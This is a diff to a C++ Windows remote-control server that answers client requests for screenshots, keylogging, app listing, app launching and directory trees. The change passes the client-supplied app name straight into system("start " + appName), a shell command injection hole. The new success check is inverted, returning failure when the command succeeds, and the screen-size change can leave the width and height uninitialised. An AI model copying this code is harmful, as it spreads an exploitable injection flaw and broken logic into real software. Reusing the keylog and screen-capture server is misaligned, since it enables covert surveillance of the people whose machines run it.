@@ -221,7 +221,7 @@ void Server::start(){
                     else if (requestFromClient.type() == SCREENSHOT_REQUEST)
                         responseToClient = this->screenShot();
                     else if(requestFromClient.type() == KEYLOG_REQUEST)
-                        responseToClient = this->keyLog(pfd.fd);
+                        responseToClient = this->keyLog();
                     else if (requestFromClient.type() == DIR_TREE_REQUEST)
                         responseToClient = this->dirTree();
                     else if (requestFromClient.type() == DISCONNECT_REQUEST)
@@ -268,88 +268,11 @@ Response Server::listApp(){
 }
 
 Response Server::startApp(const char* appName){
-    // The name of the application to retrieve information for
-
-    // Get the size of the buffer required to store the application information
-    stringstream stream;
-    stream << "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" << appName << ".exe";
-    string path = stream.str();
-
-    DWORD dataSize = 0;
-    if (RegGetValue(
-        HKEY_LOCAL_MACHINE, 
-        path.c_str(), 
-        nullptr, 
-        RRF_RT_REG_SZ, 
-        nullptr, 
-        nullptr, 
-        &dataSize) != ERROR_SUCCESS){
-        cerr << "Error: Failed to get data size\n";
+    stringstream os;
+    os << "start " << appName;
+    string cmd = os.str();
+    if(system(cmd.c_str()) == 0)
         return Response(START_APP_RESPONSE, FAIL_CODE, 0, NULL);
-    }
-
-    // Allocate a buffer to store the application information
-    vector<uint8_t> data(dataSize);
-
-    // Retrieve the application information
-    if (RegGetValue(
-        HKEY_LOCAL_MACHINE, 
-        path.c_str(), 
-        nullptr, 
-        RRF_RT_REG_SZ, 
-        nullptr, 
-        &data[0], 
-        &dataSize) != ERROR_SUCCESS){
-        cerr << "Error: Failed to get data\n";
-        return Response(START_APP_RESPONSE, FAIL_CODE, 0, NULL);
-    }
-
-    // Convert the data to a wide string
-    string appPath(reinterpret_cast<char*>(&data[0]));
-
-    // Check if the file exists
-    if (!std::filesystem::exists(appPath.c_str())){
-        cerr << "File not found\n";
-        return Response(START_APP_RESPONSE, FAIL_CODE, 0, NULL);
-    }
-
-    cout << "Application path: " << appPath << '\n';
-    const char* cmd = appPath.c_str(); // works... calc.exe is in windows/system32 
-    // char* cmd = "chrome"; // doesn't work... how can I add the path if it's not known (e.g. windows installed on D:\)
-    // char* cmd = "c:/program files (x86)/google/chrome/application/chrome"; // works (even without extension .exe)
-
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
-
-    // Start the child process. 
-    if (!CreateProcess(
-        NULL,   // No module name (use command line)
-        cmd,            // Command line
-        NULL,           // Process handle not inheritable
-        NULL,           // Thread handle not inheritable
-        FALSE,          // Set handle inheritance to FALSE
-        0,              // No creation flags
-        NULL,           // Use parent's environment block
-        NULL,           // Use parent's starting directory 
-        &si,            // Pointer to STARTUPINFO structure
-        &pi)           // Pointer to PROCESS_INFORMATION structure
-    ){
-        cerr << "CreateProcess failed (" << GetLastError() << ").\n";
-        delete[] cmd;
-        return Response(START_APP_RESPONSE, FAIL_CODE, 0, NULL);
-    }
-
-    // Wait until child process exits.
-    WaitForSingleObject(pi.hProcess, INFINITE);
-
-    // Close process and thread handles. 
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-    delete[] cmd;
     return Response(START_APP_RESPONSE, OK_CODE, 0, NULL);
 }
 
@@ -420,8 +343,16 @@ Response Server::screenShot(){
     HDC hdcScreen = GetDC(NULL);
     HDC hdcMem = CreateCompatibleDC(hdcScreen);
 
-    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
-    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+    DEVMODE dm;
+    dm.dmSize = sizeof(dm);
+
+    int screenWidth, screenHeight;
+
+    if (EnumDisplaySettings(nullptr, ENUM_CURRENT_SETTINGS, &dm)) {
+        screenWidth = dm.dmPelsWidth;
+        screenHeight = dm.dmPelsHeight;
+    }
+
     HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
 
     SelectObject(hdcMem, hBitmap);
